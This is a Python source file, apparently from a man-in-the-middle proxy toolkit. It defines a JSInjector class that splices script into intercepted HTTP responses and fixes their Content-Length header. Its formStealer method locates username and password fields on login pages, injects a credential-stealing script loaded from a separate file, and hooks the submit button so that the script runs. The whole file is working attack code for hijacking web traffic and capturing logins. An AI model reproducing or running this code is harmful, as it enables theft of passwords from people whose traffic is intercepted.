from bs4 import BeautifulSoup
from Functions import Functions

class JSInjector:
    def __init__(self):
        self._tools = Functions()
        self._injectionPlaces = ["</head>", "<script ", "</body>", "<div>"]
        self._hasFormStealer = False

    def injectScriptIntoHeader(self, response, codeToInject=""):
        header = self._tools.getHeader(response)
        oldresponse = (response, 0)
        injected_script = False


        # Try to inject code into the response body
        for ijplace in self._injectionPlaces:
            try:
                print "[*] Try to inject code in: " + str(ijplace)
                start = response.index(ijplace)
                response = response[:start] + codeToInject + response[start:]
                injected_script = True
                break
            except Exception:
                #print "[*] " + str(ijplace) + " failed! Next..."
                continue

        if not injected_script:
            print "[-] Failed to inject..."
            return oldresponse

        # Calculate the new length and change it in the header
        headernew, status = self._tools.changeContentlength(header, len(codeToInject))

        # If both are true we are ready to change all in the response
        try:
            if status and injected_script:
                response = response.replace(header, headernew)
                print "[+] Injection done!"
                return response, 1
        except Exception:
            return oldresponse

        return oldresponse



    def formStealer(self, response):

        if self._hasFormStealer:
            return response

        oldresponse = response
        try:
            soup = BeautifulSoup(response, 'html.parser')
            txtinput = soup.findAll('input', {'type': 'text'})
            pwdinput = soup.findAll('input', {'type': 'password'})
        except Exception:
            return oldresponse

        username = ""
        password = ""

        # Get the name of the form


        for elem1 in txtinput:
            username = elem1['name']

        for elem2 in pwdinput:
            password = elem2['name']


        if username is "" or password is "":
            return oldresponse


        #print response

        #Get formstealer script
        script = ""
        with open("MultiProxyTool/formstealer.html", 'r') as f:
            script = f.readlines()

        if len(script) is 0:
            return oldresponse

        scriptSTR = ""
        for s in script:
            scriptSTR += s

        if scriptSTR is "":
            return oldresponse

        # Replace placeholder name with real formname
        scriptSTR = scriptSTR.replace("PLACEHOLDERUSERNAME", username)
        scriptSTR = scriptSTR.replace("PLACEHOLDERPASSWORD", password)

        #print scriptSTR

        response, status = self.injectScriptIntoHeader(response, scriptSTR)

        """
            After script injection was successfull we need to add an onclick event to the function.
            If the injection failed we dont need to add the onclick event
        """

        if status:
            print "Adding onClick event"
            try:
                start = response.index('type="submit"') + len('type="submit"') + 1
                response = str(response[:start]) + 'onclick="verifyLoginZ()" ' + str(response[start:])
                header = self._tools.getHeader(response)

            except Exception:
                return oldresponse

        self._hasFormStealer = True
        return response